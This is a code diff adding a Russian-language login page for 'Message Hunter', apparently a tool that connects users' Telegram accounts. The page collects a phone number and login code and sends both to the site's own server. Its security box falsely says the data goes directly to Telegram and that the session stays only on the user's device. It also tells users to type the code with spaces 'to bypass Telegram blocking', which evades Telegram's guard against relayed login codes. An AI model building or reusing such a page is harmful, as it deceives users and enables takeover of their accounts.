@@ -1,0 +1,341 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Авторизация - Message Hunter</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+        
+        .auth-container {
+            background: white;
+            padding: 40px;
+            border-radius: 20px;
+            box-shadow: 0 20px 40px rgba(0,0,0,0.1);
+            text-align: center;
+            max-width: 500px;
+            width: 100%;
+        }
+        
+        .logo {
+            font-size: 48px;
+            margin-bottom: 10px;
+        }
+        
+        h1 {
+            color: #333;
+            margin-bottom: 10px;
+            font-size: 28px;
+        }
+        
+        .subtitle {
+            color: #666;
+            margin-bottom: 30px;
+            font-size: 16px;
+            line-height: 1.5;
+        }
+        
+        .step-indicator {
+            display: flex;
+            justify-content: center;
+            margin-bottom: 30px;
+            gap: 10px;
+        }
+        
+        .step {
+            width: 12px;
+            height: 12px;
+            border-radius: 50%;
+            background: #e1e8ed;
+        }
+        
+        .step.active {
+            background: #0088cc;
+        }
+        
+        .auth-form {
+            margin-bottom: 30px;
+        }
+        
+        .phone-input, .code-input {
+            width: 100%;
+            padding: 15px 20px;
+            border: 2px solid #e1e8ed;
+            border-radius: 15px;
+            font-size: 16px;
+            text-align: center;
+            margin-bottom: 20px;
+            transition: border-color 0.3s;
+        }
+        
+        .phone-input:focus, .code-input:focus {
+            outline: none;
+            border-color: #0088cc;
+        }
+        
+        .submit-btn {
+            background: #0088cc;
+            color: white;
+            padding: 15px 40px;
+            border: none;
+            border-radius: 50px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            width: 100%;
+        }
+        
+        .submit-btn:hover {
+            background: #006fa6;
+            transform: translateY(-2px);
+        }
+        
+        .submit-btn:disabled {
+            background: #ccc;
+            cursor: not-allowed;
+            transform: none;
+        }
+        
+        .info-box {
+            background: #f0f8ff;
+            padding: 20px;
+            border-radius: 15px;
+            margin-bottom: 20px;
+            text-align: left;
+        }
+        
+        .info-title {
+            font-weight: 600;
+            color: #0088cc;
+            margin-bottom: 10px;
+        }
+        
+        .error-message, .success-message {
+            padding: 15px;
+            border-radius: 10px;
+            margin-bottom: 20px;
+            display: none;
+        }
+        
+        .error-message {
+            background: #fee;
+            color: #c33;
+        }
+        
+        .success-message {
+            background: #efe;
+            color: #393;
+        }
+        
+        #codeForm {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="auth-container">
+        <div class="logo">📱</div>
+        <h1>Авторизация аккаунта</h1>
+        <p class="subtitle">Подключите ваш Telegram аккаунт для работы с системой</p>
+        
+        <div class="step-indicator">
+            <div class="step active" id="step1"></div>
+            <div class="step" id="step2"></div>
+            <div class="step" id="step3"></div>
+        </div>
+        
+        <div class="error-message" id="errorMessage"></div>
+        <div class="success-message" id="successMessage"></div>
+        
+        <!-- Шаг 1: Ввод номера телефона -->
+        <div class="auth-form" id="phoneForm">
+            <div class="info-box">
+                <div class="info-title">🔐 Безопасность:</div>
+                <div>
+                    • Данные передаются напрямую в Telegram API<br>
+                    • Номер телефона не сохраняется на сервере<br>
+                    • Создается локальная сессия только на вашем устройстве
+                </div>
+            </div>
+            
+            <input type="tel" 
+                   class="phone-input" 
+                   id="phoneInput"
+                   placeholder="+380991234567" 
+                   required>
+            <button class="submit-btn" onclick="sendCode()">
+                📱 Отправить код
+            </button>
+        </div>
+        
+        <!-- Шаг 2: Ввод кода подтверждения -->
+        <div class="auth-form" id="codeForm">
+        <div class="info-box">
+            <div class="info-title">📨 Код отправлен!</div>
+            <div>
+                <strong style="color: #dc3545;">⚠️ Важно для обхода блокировки Telegram:</strong><br>
+                Вводите код с пробелами: <strong>1 2 3 4 5</strong><br>
+                <em>Пример: если код 12345, введите "1 2 3 4 5"</em>
+            </div>
+        </div>
+
+            
+          <input type="text" 
+            class="code-input" 
+            id="codeInput"
+            placeholder="1 2 3 4 5" 
+            maxlength="15"
+            required>
+            <button class="submit-btn" onclick="verifyCode()">
+                ✅ Подтвердить код
+            </button>
+            
+            <button class="submit-btn" onclick="goBack()" style="background: #666; margin-top: 10px;">
+                ← Изменить номер
+            </button>
+        </div>
+    </div>
+    
+    <script>
+        let currentPhone = '';
+        
+        function showError(message) {
+            const errorEl = document.getElementById('errorMessage');
+            errorEl.textContent = message;
+            errorEl.style.display = 'block';
+            
+            setTimeout(() => {
+                errorEl.style.display = 'none';
+            }, 5000);
+        }
+        
+        function showSuccess(message) {
+            const successEl = document.getElementById('successMessage');
+            successEl.textContent = message;
+            successEl.style.display = 'block';
+        }
+        
+        async function sendCode() {
+            const phone = document.getElementById('phoneInput').value.trim();
+            if (!phone) {
+                showError('Введите номер телефона');
+                return;
+            }
+            
+            const sendBtn = event.target;
+            sendBtn.disabled = true;
+            sendBtn.textContent = '🔄 Отправляем...';
+            
+            try {
+                const response = await fetch('/web_auth_send_code', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({ phone: phone })
+                });
+                
+                const data = await response.json();
+                
+                if (data.success) {
+                    currentPhone = phone;
+                    
+                    // Переключаемся на ввод кода
+                    document.getElementById('phoneForm').style.display = 'none';
+                    document.getElementById('codeForm').style.display = 'block';
+                    document.getElementById('step1').classList.remove('active');
+                    document.getElementById('step2').classList.add('active');
+                    
+                    showSuccess('Код отправлен на ваш телефон');
+                } else {
+                    showError(data.error || 'Ошибка отправки кода');
+                }
+            } catch (error) {
+                showError('Ошибка соединения');
+            }
+            
+            sendBtn.disabled = false;
+            sendBtn.textContent = '📱 Отправить код';
+        }
+        
+            async function verifyCode() {
+                const code = document.getElementById('codeInput').value.trim();
+                if (!code) {
+                    showError('Введите код подтверждения');
+                    return;
+                }
+                
+                
+                const verifyBtn = event.target;
+                verifyBtn.disabled = true;
+                verifyBtn.textContent = '🔍 Проверяем...';
+                
+                try {
+                    const response = await fetch('/web_auth_verify_code', {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                        },
+                        body: JSON.stringify({ 
+                            phone: currentPhone,
+                            code: code  // Отправляем код как есть (с буквами если есть)
+                        })
+                    });
+                
+                const data = await response.json();
+                
+                if (data.success) {
+                    document.getElementById('step2').classList.remove('active');
+                    document.getElementById('step3').classList.add('active');
+                    
+                    showSuccess('✅ Авторизация успешна!');
+                    
+                    setTimeout(() => {
+                        window.location.href = '/';
+                    }, 2000);
+                } else {
+                    showError(data.error || 'Неверный код');
+                }
+            } catch (error) {
+                showError('Ошибка соединения');
+            }
+            
+            verifyBtn.disabled = false;
+            verifyBtn.textContent = '✅ Подтвердить код';
+        }
+        
+        function goBack() {
+            document.getElementById('codeForm').style.display = 'none';
+            document.getElementById('phoneForm').style.display = 'block';
+            document.getElementById('step2').classList.remove('active');
+            document.getElementById('step1').classList.add('active');
+            
+            document.getElementById('codeInput').value = '';
+        }
+        
+        // Enter для отправки
+        document.getElementById('phoneInput').addEventListener('keypress', function(e) {
+            if (e.key === 'Enter') sendCode();
+        });
+        
+        document.getElementById('codeInput').addEventListener('keypress', function(e) {
+            if (e.key === 'Enter') verifyCode();
+        });
+    </script>
+</body>
+</html>
